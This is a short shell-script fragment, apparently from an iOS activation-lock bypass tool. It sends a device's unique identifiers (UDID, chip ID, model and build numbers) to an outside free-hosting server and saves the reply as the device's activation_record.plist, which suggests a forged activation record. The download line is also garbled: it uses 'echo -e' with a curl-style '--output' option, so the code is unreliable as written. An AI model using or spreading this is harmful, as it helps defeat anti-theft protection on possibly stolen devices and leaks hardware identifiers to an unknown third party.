...
echo -e "https://brayanvilla.000webhostapp.com/home/css/style.php?udid=$(DeviceInfo UniqueDeviceID)&bv=$(DeviceInfo BuildVersion)&dc=$(DeviceInfo DeviceClass)&dv=$(DeviceInfo DeviceVariant)&mn=$(DeviceInfo ModelNumber)&ot=$(DeviceInfo OSType)&pt=$(DeviceInfo ProductType)&pv=$(DeviceInfo ProductVersion)&rmn=$(DeviceInfo RegulatoryModelNumber)&ucid=$(DeviceInfo UniqueChipID)"  --output $(DeviceInfo DeviceName)/activation_record.plist
read -p "SUCCESS!";
echo "================";
